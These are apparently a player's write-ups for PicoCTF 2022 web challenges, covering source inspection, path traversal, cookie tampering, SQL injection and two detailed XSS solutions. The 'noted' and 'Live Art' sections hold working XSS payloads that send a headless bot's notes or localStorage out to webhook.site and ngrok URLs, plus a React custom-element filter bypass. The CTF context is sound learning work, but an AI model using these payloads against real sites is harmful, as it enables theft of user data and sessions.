---
description: Write-ups for PicoCTF 2022 Challenges
---

# PicoCTF 2022

## Web Exploit

Here are the web challenges that I completed in PicoCTF 2022

### Includes <a href="#includes" id="includes"></a>

**Description:** Can you get the flag?

**Points:** 100

#### **Solution**

The title is includes so it probably has something to do with imports on the HTML

{% hint style="info" %}
**Hint 1:** Is there more code than what the inspector initially shows?
{% endhint %}

There were two files that were imported `style.css` and `script.js` and both has part of the flag. \
\
**Flag:** picoCTF{1nclu51v17y\_1of2\_f7w\_2of2\_4d305f36}

### Inspect HTML <a href="#inspect-html" id="inspect-html"></a>

**Description:** Can you get the flag?

**Points:** 100

#### **Solution**

The title suggest we "inspect HTML"

The source was&#x20;

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>On Histiaeus</title>
  </head>
  <body>
    <h1>On Histiaeus</h1>
    <p>However, according to Herodotus, Histiaeus was unhappy having to stay in
       Susa, and made plans to return to his position as King of Miletus by 
       instigating a revolt in Ionia. In 499 BC, he shaved the head of his 
       most trusted slave, tattooed a message on his head, and then waited for 
       his hair to grow back. The slave was then sent to Aristagoras, who was 
       instructed to shave the slave's head again and read the message, which 
       told him to revolt against the Persians.</p>
    <br>
    <p> Source: Wikipedia on Histiaeus </p>
	<!--picoCTF{1n5p3t0r_0f_h7ml_b6602e8e}-->
  </body>
</html>

```

**Flag:** picoCTF{1n5p3t0r\_0f\_h7ml\_b6602e8e}

### Local Authority <a href="#local-authority" id="local-authority"></a>

**Description:** Can you get the flag?

**Points:** 100

#### **Solution**

The site opens basic looking login page.

{% hint style="info" %}
**Hint 1:** How is the password checked on this website?
{% endhint %}

Hint suggest we bypass the login. Let's test it with username:password as a:a.&#x20;

It opens `login.php` which says "Login Failed". After viewing source of this page I found a file named `secure.js` being imported. The contents were:

```javascript
function checkPassword(username, password)
{
  if( username === 'admin' && password === 'strongPassword098765' )
  {
    return true;
  }
  else
  {
    return false;
  }
}

```

\
**Flag:** picoCTF{j5\_15\_7r4n5p4r3n7\_8086bcb1}

### Search source <a href="#search-source" id="search-source"></a>

**Description:** The developer of this website mistakenly left an important artifact in the website source, can you find it?

**Points:** 100

#### **Solution**

The title suggest we search through the source again.

{% hint style="info" %}
**Hint 1:** How could you mirror the website on your local machine so you could use more powerful tools for searching?
{% endhint %}

You could probably download the source by "save as" and then use some searching tool for the terms "picoCTF" however I just instinctively tried to search couple file manually one of which was `style.css` where I found the flag.\
\
**Flag:** picoCTF{1nsp3ti0n\_0f\_w3bpag3s\_869d23af}

### Forbidden Paths <a href="#forbidden-paths" id="forbidden-paths"></a>

**Description:** We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?

**Points:** 200

#### **Solution**

The description pretty much tells you what to do. The flag is located at `../../../../flag.txt`

Just input the path and you'll see the flag.\
\
**Flag:** picoCTF{7h3\_p47h\_70\_5ucc355\_e73ad00d}

### Power Cookie <a href="#power-cookie" id="power-cookie"></a>

**Description:** Can you get the flag?

**Points:** 200

#### **Solution**

This is a case where we have to modify the cookie to elevate our access

{% hint style="info" %}
**Hint 1:** Do you know how to modify cookies?
{% endhint %}

After clicking "Continue as guest". I saw an unauthorised page. The cookie was as following ![](<../.gitbook/assets/image (22).png>)

I changed the value to 1 and it showed me the flag. Simple!\
\
**Flag:** picoCTF{gr4d3\_A\_c00k13\_80bad8fa}

### Roboto Sans <a href="#roboto-sans" id="roboto-sans"></a>

**Description:** The flag is somewhere on this web application not necessarily on the website. Find it.

**Points: 2**00

#### **Solution**

In my opinion this was the worst because it was guessy. It took me way too long to do this. "Roboto Sans" and "Not on website but on web application" kinda point you to look at "robots.text" (ikr??).&#x20;

```
User-agent *
Disallow: /cgi-bin/
Think you have seen your flag or want to keep looking.

ZmxhZzEudHh0;anMvbXlmaW
anMvbXlmaWxlLnR4dA==
svssshjweuiwl;oiho.bsvdaslejg
Disallow: /wp-admin/
```

Looks like there is a base64 string there. After decoding `anMvbXlmaWxlLnR4dA==` it is: `js/myfile.txt`

**Flag:** picoCTF{Who\_D03sN7\_L1k5\_90B0T5\_6ac64608}

### Secrets <a href="#secrets" id="secrets"></a>

**Description:** We have several pages hidden. Can you find the one with the flag?

**Points: 2**00

#### **Solution**

We start by inspecting source and there was one interesting find.  `secret/assets/index.css`

I went to `/secret` where I found another page with a gif. After inspecting it's source I found `hidden/file.css`

I continued to `secret/hidden` and I found a new page. Inspected that. Found `superhidden/login.css` continued to `secret/hidden/superhidden` and there I found the flag after viewing source.\
\
**Flag:** picoCTF{succ3ss\_@h3n1c@10n\_f55d602d}

### SQL Direct <a href="#sql-direct" id="sql-direct"></a>

**Description:** Connect to this PostgreSQL server and find the flag!

**Points:** 200

#### **Solution**

I downloaded PostgreSQL.  I connected to the credentials and checked for databases with command `\l`

```
   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges
-----------+----------+----------+------------+------------+-----------------------
 pico      | postgres | UTF8     | en_US.utf8 | en_US.utf8 |
 postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 |
 template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
(4 rows)
```

I connected to database `pico` with `\c pico`

I then view tables with `\dt+`. I found&#x20;

```
                    List of relations
 Schema | Name  | Type  |  Owner   | Size  | Description
--------+-------+-------+----------+-------+-------------
 public | flags | table | postgres | 16 kB |
```

A simple `SELECT * FROM flags;` revealed the flag.

**Flag:** picoCTF{L3arN\_S0m3\_5qL\_t0d4Y\_34fa2564}

### SQLiLite <a href="#sqlilite" id="sqlilite"></a>

**Description:** Can you login to this website?

**Points:** 300

#### **Solution**

The site opens a login page. I tested with credentials a:a again. It revealed this page:![](<../.gitbook/assets/image (24) (1).png>)

Here we can see the SQL query. This a a very easy one. We can just an `or` statement with an always true case such as `1=1` and comment out the password section with `--`

Username: `' OR 1=1 --`

Password: a (anything)

![](<../.gitbook/assets/image (27) (1).png>)

Successfully logged in. You can find the flg in source code.\


**Flag:** picoCTF{L00k5\_l1k3\_y0u\_solv3d\_it\_cd1df56b}

### noted <a href="#noted" id="noted"></a>

**Description:** I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right?

**Points: 5**00

#### **Solution**

This was a challenging one. A little bit.

{% hint style="info" %}
**Hint 1:** Are you sure I followed all the best practices?
{% endhint %}

{% hint style="info" %}
**Hint 2:** There's more than just HTTP(S)!
{% endhint %}

{% hint style="info" %}
**Hint 3:** Things that require user interaction normally in Chrome might not require it in Headless Chrome.
{% endhint %}

After browsing the site for few minutes, I realised that you can inject html code while creating new notes.

![](<../.gitbook/assets/image (23).png>)![](<../.gitbook/assets/image (25) (1).png>)

The source code was available to download. Let's look at what's going on in the backend. `web.js` has all the endpoints and the server is run internally on `localhost:8080`. However the most interesting part is `report.js` which handles the `/report` endpoint. Let's look at its code.

```javascript
async function run(url) {
	let browser;

	try {
		module.exports.open = true;
		browser = await puppeteer.launch({
			headless: true,
			pipe: true,
			args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'],
			slowMo: 10
		});

		let page = (await browser.pages())[0]

		await page.goto('http://0.0.0.0:8080/register');
		await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));
		await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));

		await Promise.all([
			page.click('[type="submit"]'),
			page.waitForNavigation({ waituntil: 'domcontentloaded' })
		]);

		await page.goto('http://0.0.0.0:8080/new');
		await page.type('[name="title"]', 'flag');
		await page.type('[name="content"]', process.env.flag ?? 'ctf{flag}');

		await Promise.all([
			page.click('[type="submit"]'),
			page.waitForNavigation({ waituntil: 'domcontentloaded' })
		]);

		await page.goto('about:blank')
		await page.goto(url);
		await page.waitForTimeout(7500);

		await browser.close();
	} catch(e) {
		console.error(e);
		try { await browser.close() } catch(e) {}
	}

	module.exports.open = false;
}
```

Couple of things to notice here:

* It's a puppeteer bot
* It is a headless, no-sandbox chromium browser (it's infamous of lax security)
* The bot creates a new account with completely random username and password. Creates a new note with content as `process.env.flag` i. e the flag.&#x20;
* The bot in the end opens the `url` we provide on the `/reports` page.

The ideal plan would be to read the contents of "My notes" of the bot account which includes the flag. I had several ideas like use fetch API to login to a test account and create a note with contents from the bot account but the `csrf` library used was making it very tricky to do that.&#x20;

After some manual testing I figured that you can access internet through the puppeteer bot (even though they said we couldn't? wth?)

Now this opens a lot of possibilities. I can make a get request containing the "My Notes" contents as an argument. So, here's my plan:

![The "Plan"](<../.gitbook/assets/MX (2).jpg>)

So, my plan is simple. I will create an account on main servers with credentials `a:a.`

Then, I will created a script that will access `webhook.site` url with `body` contents of a particular window named "pwn" (This will be created later). Let's have a look at the script.

```javascript
<script>
  if (window.location.search.includes('pwn'))
    window.location = 'https://webhook.site/a5591c91-8eec-4366-9388-e231484f01b5?' + window.open('', 'pwn').document.body.textContent
</script>
```

I added a clause to check for `?pwn` in the url because without it the website was crashing since it was redirecting every time you accessed notes. Now, let's go ahead and plant it.

![Planted XSS](<../.gitbook/assets/image (21).png>)

Now, it is time for the main script. The one that goes into the `/report` page, into the `url` field.

Here I want to do three things inside puppeteer in a sequence.&#x20;

1. Open a new window named "pwn" with url `http://localhost/notes`. This will open the "My notes" page as bot account. Which has the flag.
2. Login in to our test account with credentials `a:a`\`
3. Go to `/notes?pwn` after logging in which will capture the contents of "pwn" window automatically due to xss.

That's it. That should do it. Now let's have a look at the code.&#x20;

```html
data:text/html,
<form action="http://localhost:8080/login" method=POST id=pwn target=_blank>
  <input type="text" name="username" value="a"><input type="text" name="password" value="a">
</form>
<script>
  window.open('http://localhost:8080/notes', 'pwn');
  setTimeout(`pwn.submit()`, 1000);
  setTimeout(`window.location='http://localhost:8080/notes?pwn'`, 1500);
</script>
```

`data:text/html` tells chrome that the contents are html. Next, we create a form with action as the local login page and pre-enter the credentials as `values` in the input fields. Next we execute our sequence inside a script tag. We open a window named "pwn" with notes url (This has our flag in body). Then we wait 1 second and submit our login form. After we are logged in as "a:a" we then open `/notes?pwn` after 1.5 seconds which will trigger our XSS and steal the contents from the "pwn" tag which still has body from the bot account (and the flag).

We'll go ahead and first get this script in one line and then enter it into the "url" section of `/report`.

Now we wait for 2.5 seconds :relaxed:

![THE FLAG](<../.gitbook/assets/image (26) (1).png>)

**Flag:** picoCTF{p00rth0s\_parl1ment\_0f\_p3p3gas\_386f0184}

### Live Art <a href="#live-art" id="live-art"></a>

**Description:** There's nothing quite as fun as drawing for an audience. So sign up for LiveArt today and show the world what you can do.

**Points:** 500

{% hint style="info" %}
**Hint 1:** The flag will be the admin's username/broadcast link, at the origin
{% endhint %}

{% hint style="info" %}
**Hint 2:** [The flag will be the admin's username/broadcast link, at the origin](https://html.spec.whatwg.org/multipage/custom-elements.html)
{% endhint %}

#### **Solution**

This one was the trickiest of them all and I had to spend hours on it. I had to go through the source code and manually check every component for exploit (by spamming everything with console.logs ahah).&#x20;

Note: I am not super familiar with react.js so I might be missing something here?

Okay let's get started with what I found.

Firstly, this is is sort of similar to the "noted" challenge above as this has a puppeteer bot as well and the flag is stored in the "localStorage" of the puppeteer bot.

The key part of this challenge is actually finding the exploit. They payload was straight forward. On running the client source code locally I came across few interesting things. Let's go through them.

#### Hooks

```javascript
const getHashParams = <T extends Record<string, string>>() => {
  const params = new URLSearchParams(window.location.hash.substring(1));
  const result = Object.create(null);

  params.forEach((value, key) => {
    result[key] = value;
  });
  
  return result as T;
};

export const useHashParams = <T extends Record<string, string>>() => {
  const [params, setParams] = React.useState(getHashParams<T>());

  React.useEffect(() => {
    const listener = () => {
      console.log("Setting listner", params);
      setParams(getHashParams<T>());
    };

    window.addEventListener("hashchange", listener);

    return () => {
      window.removeEventListener("hashchange", listener);
    };
  });

  return params;
};j
```

This is a little bit interesting, these functions are used in the `error.tsx` file. Basically, these are reading key value pairs from the url and are returning an object as type "Record". It is interesting because you can use this record inside html elements as attributes. For example, you can use `{height: 200, width: 200}` for type `Record<string, string>` inside any HTML element like `<div ..RecordObject ></div>` and this would translate to `<div height=200 width=200></div>`&#x20;

Therefore, my first instinct was inject js code through this URL function inside an HTML element. Like `onerror=alert()` inside an image tag as the site is using image tags widely. Hence, I needed to find the right place and right payload to be able to do this. That brings us the next page.

#### Drawing

```javascript
const getWrappedError = WrapComponentError(ErrorPage)
const getWrappedViewer = WrapComponentError(Viewer);

const isWideEnough = () => window.innerWidth > 600;

interface Props {
    page: string;
}

const _Drawing = (props: Props) => {
    const [image, setImage] = React.useState<string | undefined>();
    const [bigEnough, setBigEnough] = React.useState(isWideEnough());

    const page = props.page;

    React.useEffect(() => {
        if (!page) return;

        const peer = new Peer();
        peer.on("open", () => {
            const conn = peer.connect(page);
            conn.on("data", (data) => {
                if (typeof data === "string") {
                    setImage(data);
                }
            });
        })
    }, [page]);

    React.useEffect(() => {
        const listener = () => {
            setBigEnough(isWideEnough());
        }

        window.addEventListener("resize", listener);

        return () => {
            window.removeEventListener("resize", listener);
        }
    });

    const view = bigEnough
        ? getWrappedViewer({ image })
        : getWrappedError({ error: "Please make your window bigger" });

    return (
        <div>
            { view }
        </div>
    );
};

```

At first this didn't seem weird but after running and observing locally I realised that the `isWideEnough()` is actually checking the size of the window that had accessed `/drawing` and is doing a conditional rendering:

if the window is wide enough. It runs the `viewer` but if it not then it displays `error` page. The error page is where I found that it takes parameters from url. So definitely something is happening here.&#x20;

After running and logging viewer and error pages. I realised that the viewer has a state element called `dimensions` which runs some calculations and passes it to image tag as `<img src={props.image} { ...dimensions }/>`

Now things are getting interesting, if I am able to get my `Record` type object into `dimensions` then I can inject a script inside `onerror`. The question is how.&#x20;

I noticed something while testing the behaviour of `/drawing` upon resizing the  the window. When I open the `/drawing` page in a smaller window it shows me error. But when I expand the window size of browser it runs the `isWideEnough()` asynchronously automatically renders the `viewer` tab. But this time the image is bugged.&#x20;

![Right after increasing the browser window size](<../.gitbook/assets/image (33).png>)

`<img src={props.image} { ...dimensions }/>` This is was the code it was supposed to run but here we see the both `props` and `dimensions` is empty.

This is because the states of the page `/drawing` were initiated right when we loaded the url but after the page content is re-rendered dynamically the states and props inside the second rendor did not initiate. Meaning, the current state variables on this page are the ones from `error.tsx` which we loaded first due to screen being not wide enough.&#x20;

Things get more interesting, we run `const [params, setParams] = React.useState(getHashParams());` in the `error.tsx` page. Now this will bind itself to the very first state variable on the second page which is `const [dimensions, updateDimensions] = ...` on `viewer`  (How? I am not 100% sure, perhaps it is by design of react or not following hooks best practices? I would appreciate if someone points me to the exact reason).

This means that whatever we pass variables to `dimensions` through url by just entering the followed by `#`. Let's give it a try.&#x20;

* First we open a small chrome tab and enter the url: http://`saturn.picoctf.net:63756/drawing/pwn#src=https://i.kym-cdn.com/entries/icons/facebook/000/017/788/gotem.jpg`&#x20;

![](<../.gitbook/assets/image (24).png>)

* Now we Maximize the window. This will show us the injected params inside the image tag.

![GOTEM](<../.gitbook/assets/image (27).png>)

Ok now we've established that we can inject parameters inside the image tag on `/drawing` page! Now we need to insert the `onerror` parameter. But it's not that simple. It gets filtered out by React because if it's design. We have a way around it. That is, from our second hint, Custom Elements. We can force react to treat the `<img>` tag as a custom element by passing a `is` parameter to it. ([Check this out](https://github.com/facebook/react/blob/ebd7ff65b6fea73313c210709c88224910e86339/packages/react-dom/src/shared/isCustomComponent.js#L10-L13))&#x20;

Now let's try that, we repeat same steps as above with payload URL. Our URL now will be

```
http://saturn.picoctf.net:63756/drawing/pwn#src=none&onerror=alert(%22pwn%22)&is
```

![XSS](<../.gitbook/assets/image (30).png>)

That worked like a charm. Now from here it's a simple way forward. Like I said in the beginning, there is puppeteer bot that opens URLs from `/fan-mail` the bot browser has the flag in its local storage. The plan is to repeat the same steps above inside the bot but capture the `localStorage.username` and send it to our ngrok. Since we can't make the bot resize the browser we will use `iframes`. Now the bot only allows http and https protocols. So we have to set up our payload on public url using ngrok and pass it to the bot. But first, let's create the payload.

We need the bot to do only three things.

* Load the `localhost:4000` on a low-width iframe and go to `/drawing/<anything>#src=none&onerror=<xss payload>&is`
* Increase the width of the `iframe` after loading so we trigger the xss.&#x20;
* Build an xss payload that can send `localStorage.username` to ngrok.

Here's the payload that I cam up with:

```javascript
<iframe src="none" id=frame height="1000"></iframe>
<script>
	frame.contentWindow.name = `window.open('${location.href}'+localStorage.username)`
	frame.onload = () => {
		setTimeout(`frame.contentWindow.location = 'http://localhost:4000/drawing/pwn#onerror=eval(window.name)&src=pwn&is=notpwn'`, 1000)
		setTimeout(`frame.width = 1000`, 1500)
	}
</script>
```

* Firstly, I am creating an `iframe` with `none` as source, 1000 height and default width (which is small enough to produce the error).
* Second I am storing a function that will capture the `localStorage.username` and send it to ngrok in a string format. I am using `frame.contentWindow.name` to store it since we can't store it outside the iframe context.&#x20;
  * Note, the current state of the `frame.contentWindow.name` is stored in string format. So it doesn't execute the function inside it unless we run it inside `eval()`
  * `location.href` is basically the URL of the ngrok.
* After that, I am changing the iframe src to the xss URL. Which opens the error page.
  * Note, the xss runs `eval(window.name)` which basically executes the (string) name: `window.open('${location.href}'+localStorage.username)` as javascript code. So this will open `<our ngrok url>/<flag>`
* Lastly, I am changing the width of the iframe to large enough to trigger the XSS.

Now let's save this payload as `index.html` and start our simple http server in python using `python3 -m http.server` and then start our ngrok server that listens to the simple http server on our computer.&#x20;

![The Setup](<../.gitbook/assets/image (26).png>)

Now we just enter our ngrok URL in the fan-mail section and we should see our flag in logs.

![The FLAG](<../.gitbook/assets/image (28).png>)

**Flag:**picoCTF{beam\_me\_up\_reacty\_90b651ae}
